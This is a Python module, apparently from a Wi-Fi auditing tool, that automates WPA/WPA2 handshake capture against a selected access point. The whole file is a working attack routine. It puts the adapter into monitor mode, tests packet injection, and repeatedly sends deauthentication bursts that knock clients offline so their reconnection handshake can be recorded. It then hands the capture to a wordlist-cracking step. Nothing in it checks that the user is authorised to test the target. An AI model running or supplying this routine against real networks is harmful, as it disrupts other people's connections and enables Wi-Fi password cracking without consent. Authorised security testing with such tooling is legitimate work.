"""Handshake capture workflow."""

from __future__ import annotations

import re
import subprocess
import time
from datetime import datetime
from pathlib import Path
from typing import Optional

from rich import box
from rich.live import Live
from rich.panel import Panel
from rich.table import Table

from modules.config import Settings
from modules.constants import (
    AIRODUMP_WARMUP_SEC,
    CAPTURE_TIMEOUT_SEC,
    DEAUTH_BURSTS,
    DEAUTH_GAP_SEC,
    DEFAULT_HANDSHAKE_DIR,
    REQUIRED_BINS,
)
from modules.monitor import (
    enable_monitor,
    run_deauth,
    safe_filename,
    start_airodump,
    stop_airodump,
    stop_monitor,
    test_injection,
)
from modules.tools import ensure_root, require_bins, require_capture_ready, run_cmd, which_or_none
from modules.ui import clear_screen, confirm, console, is_wpa3, pause, render_banner, warn_and_back


def format_bytes(size: int) -> str:
    if size < 1024:
        return f"{size} B"
    if size < 1024 * 1024:
        return f"{size / 1024:.1f} KB"
    return f"{size / (1024 * 1024):.1f} MB"


def cap_size_label(capfile: Optional[Path]) -> str:
    if not capfile or not capfile.exists():
        return "0 B"
    try:
        return format_bytes(capfile.stat().st_size)
    except OSError:
        return "?"


def render_capture_progress(
    elapsed: float,
    timeout: int,
    burst: int,
    captured: bool,
    capfile: Optional[Path],
    note: str,
) -> Panel:
    remaining = max(0, int(timeout - elapsed))
    pct = 0.0 if timeout <= 0 else min(1.0, elapsed / timeout)
    width = 32
    filled = int(width * pct)
    bar = "█" * filled + "░" * (width - filled)
    hs = "[bold green]YES[/bold green]" if captured else "[yellow]waiting[/yellow]"
    cap_name = capfile.name if capfile else "—"
    table = Table.grid(padding=(0, 1), expand=True)
    table.add_column(style="bold", width=12)
    table.add_column()
    table.add_row("Time", f"{int(elapsed):>3}s / {timeout}s   ({remaining}s left)")
    table.add_row("Progress", f"[cyan]{bar}[/cyan]  {int(pct * 100)}%")
    table.add_row("Deauth", f"burst {min(burst, DEAUTH_BURSTS)}/{DEAUTH_BURSTS}")
    table.add_row("Handshake", hs)
    table.add_row("Capture", f"{cap_name}  ({cap_size_label(capfile)})")
    table.add_row("Status", note)
    return Panel(table, title="Capture progress", border_style="cyan", box=box.ROUNDED)


def latest_cap(prefix: Path) -> Optional[Path]:
    caps = list(prefix.parent.glob(prefix.name + "-*.cap"))
    caps += list(prefix.parent.glob(prefix.name + "-*.pcap"))
    if not caps:
        return None
    caps.sort(key=lambda p: p.stat().st_mtime)
    return caps[-1]


def handshake_captured(capfile: Path, bssid: str) -> bool:
    if not capfile.exists() or capfile.stat().st_size < 24:
        return False

    cowpatty = which_or_none("cowpatty")
    if cowpatty:
        _code, out = run_cmd([cowpatty, "-c", "-r", str(capfile)], timeout=20)
        low = out.lower()
        if "incomplete" not in low and (
            "collected all necessary data" in low or "wpa handshake" in low
        ):
            return True

    aircrack = which_or_none("aircrack-ng")
    if aircrack:
        _code, out = run_cmd([aircrack, "-a2", "-b", bssid, str(capfile)], timeout=8)
        low = out.lower()
        if "no valid wpa handshakes" in low:
            return False
        if re.search(r"[1-9]\d*\s+handshake", low):
            return True
        if "handshake" in low and "0 handshake" not in low:
            return True
    return False


def action_capture(settings: Settings) -> None:
    if not require_capture_ready(settings):
        return
    if is_wpa3(settings.target.security):
        warn_and_back(
            "WPA3 not supported",
            "The selected network uses WPA3/SAE.\n"
            "aircrack-ng handshake capture (-a2) does not apply to SAE.\n"
            "Pick a WPA/WPA2 target from menu [bold]2[/bold].",
        )
        return
    if not ensure_root("capture") or not require_bins(REQUIRED_BINS):
        return

    handshake_dir = Path(settings.handshake_dir or DEFAULT_HANDSHAKE_DIR)
    try:
        handshake_dir.mkdir(parents=True, exist_ok=True)
    except OSError as exc:
        warn_and_back("Handshake folder", f"Could not create {handshake_dir}:\n{exc}")
        return

    clear_screen()
    render_banner(settings)
    summary = Table(box=box.ROUNDED, expand=True, show_header=False)
    summary.add_column("k", style="bold", width=16)
    summary.add_column("v")
    summary.add_row("Adapter", settings.interface)
    summary.add_row("Target", f"{settings.target.ssid}  ({settings.target.bssid})")
    summary.add_row("Channel", settings.target.channel)
    sec = settings.target.security or "-"
    summary.add_row("Security", f"[yellow]{sec}[/yellow]" if is_wpa3(sec) else sec)
    summary.add_row("Handshake dir", str(handshake_dir))
    console.print(Panel(summary, title="Capture handshake", border_style="yellow"))
    console.print(
        "[yellow]Deauthentication will briefly disconnect clients on this access point "
        "so a WPA handshake can be captured.[/yellow]\n"
    )
    if not confirm("Continue?", default=False):
        return

    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    prefix = handshake_dir / f"{safe_filename(settings.target.ssid)}_{stamp}"
    bssid = settings.target.bssid
    channel = settings.target.channel
    base_iface = settings.interface
    mon: Optional[str] = None
    dump_proc: Optional[subprocess.Popen] = None
    captured = False
    capfile: Optional[Path] = None
    restored = False

    try:
        console.print("\n[dim]Checking adapter: monitor mode...[/dim]")
        mon, mon_out = enable_monitor(base_iface, channel)
        if not mon:
            console.print("[dim]Restoring adapter / NetworkManager...[/dim]")
            stop_monitor(mon, base_iface)
            restored = True
            warn_and_back(
                "Monitor mode failed",
                mon_out
                + "\n\nInternal Realtek adapters often lack monitor/injection support. "
                "A USB adapter with better aircrack-ng support may be required.",
            )
            return
        console.print(f"[green]Monitor interface:[/green] [bold]{mon}[/bold]")

        console.print("[dim]Checking adapter: packet injection...[/dim]")
        inject_ok, inject_out = test_injection(mon)
        if not inject_ok:
            last_lines = "\n".join(inject_out.splitlines()[-8:]) if inject_out else ""
            console.print("[dim]Restoring adapter / NetworkManager...[/dim]")
            stop_monitor(mon, base_iface)
            restored = True
            warn_and_back(
                "Injection test failed",
                "This adapter cannot inject packets, so capture would likely stall.\n"
                "Stopped immediately instead of waiting for the timeout.\n\n"
                + (last_lines or "No output from aireplay-ng -9."),
            )
            return

        console.print("[green]Injection test passed.[/green]")

        dump_proc, dump_err = start_airodump(mon, bssid, channel, prefix)
        if dump_err or dump_proc is None:
            warn_and_back("Capture failed", dump_err or "airodump-ng did not start")
            return

        started = time.time()
        burst = 0
        last_hs_check = 0.0
        note = "Warming up airodump-ng..."
        with Live(
            render_capture_progress(0, CAPTURE_TIMEOUT_SEC, 0, False, None, note),
            console=console,
            refresh_per_second=4,
        ) as live:
            time.sleep(AIRODUMP_WARMUP_SEC)
            deadline = started + CAPTURE_TIMEOUT_SEC
            while time.time() < deadline:
                elapsed = time.time() - started
                capfile = latest_cap(prefix)
                live.update(
                    render_capture_progress(
                        elapsed, CAPTURE_TIMEOUT_SEC, burst, captured, capfile, note
                    )
                )

                if capfile and elapsed - last_hs_check >= 3:
                    note = "Checking for handshake..."
                    live.update(
                        render_capture_progress(
                            elapsed, CAPTURE_TIMEOUT_SEC, burst, captured, capfile, note
                        )
                    )
                    if handshake_captured(capfile, bssid):
                        captured = True
                        note = "Handshake captured"
                        live.update(
                            render_capture_progress(
                                elapsed, CAPTURE_TIMEOUT_SEC, burst, captured, capfile, note
                            )
                        )
                        break
                    last_hs_check = elapsed

                if captured:
                    break

                burst += 1
                if burst <= DEAUTH_BURSTS:
                    note = f"Deauth burst {burst}/{DEAUTH_BURSTS}"
                    live.update(
                        render_capture_progress(
                            time.time() - started,
                            CAPTURE_TIMEOUT_SEC,
                            burst,
                            captured,
                            capfile,
                            note,
                        )
                    )
                    code, out = run_deauth(mon, bssid)
                    if code != 0:
                        tail = out.splitlines()[-1] if out else str(code)
                        note = f"aireplay-ng warning: {tail}"
                else:
                    note = "Waiting for a client to reconnect..."

                gap_end = time.time() + DEAUTH_GAP_SEC
                while time.time() < gap_end and time.time() < deadline:
                    elapsed = time.time() - started
                    capfile = latest_cap(prefix)
                    live.update(
                        render_capture_progress(
                            elapsed, CAPTURE_TIMEOUT_SEC, burst, captured, capfile, note
                        )
                    )
                    if capfile and elapsed - last_hs_check >= 3:
                        note = "Checking for handshake..."
                        live.update(
                            render_capture_progress(
                                elapsed, CAPTURE_TIMEOUT_SEC, burst, captured, capfile, note
                            )
                        )
                        if handshake_captured(capfile, bssid):
                            captured = True
                            note = "Handshake captured"
                            live.update(
                                render_capture_progress(
                                    elapsed,
                                    CAPTURE_TIMEOUT_SEC,
                                    burst,
                                    captured,
                                    capfile,
                                    note,
                                )
                            )
                            break
                        last_hs_check = elapsed
                        note = (
                            f"Deauth burst {burst}/{DEAUTH_BURSTS}"
                            if burst <= DEAUTH_BURSTS
                            else "Waiting for a client to reconnect..."
                        )
                    time.sleep(0.4)
                if captured:
                    break

        stop_airodump(dump_proc)
        dump_proc = None
        capfile = capfile or latest_cap(prefix)

        console.print("[dim]Restoring adapter / NetworkManager...[/dim]")
        stop_monitor(mon, base_iface)
        restored = True

        if not captured:
            extra = f"\nCapture file kept at:\n{capfile}" if capfile else ""
            warn_and_back(
                "No handshake captured",
                "Timed out before a WPA handshake was seen.\n"
                "No client reconnected, or the signal is too weak."
                + extra,
            )
            return

        console.print(
            Panel(
                f"Handshake saved:\n[bold]{capfile}[/bold]\n\n"
                "Use [bold]7 — Crack a saved handshake[/bold] to test the wordlist.",
                title="Capture complete",
                border_style="green",
                box=box.ROUNDED,
            )
        )
        pause()
    except KeyboardInterrupt:
        console.print("\n[yellow]Capture cancelled.[/yellow]")
    finally:
        stop_airodump(dump_proc)
        if not restored:
            console.print("[dim]Restoring adapter / NetworkManager...[/dim]")
            stop_monitor(mon, base_iface)

